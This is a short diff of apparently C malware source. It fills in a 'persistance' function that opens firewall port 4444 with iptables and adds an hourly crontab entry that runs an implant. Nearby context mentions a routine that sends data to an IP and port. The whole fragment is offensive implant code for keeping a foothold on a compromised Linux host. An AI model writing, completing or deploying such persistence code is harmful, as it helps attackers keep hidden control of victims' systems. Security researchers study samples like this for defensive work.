@@ -28,7 +28,8 @@ int main()
 
 void persistance()
 {
-  system(" sudo iptables -A ");
+  system(" sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT");
+  system(" (crontab -l ; echo \"0 * * * * /path/to/implant\") | crontab -");
 }
 
 // Takes a string of data and an IP and Port and sends the string
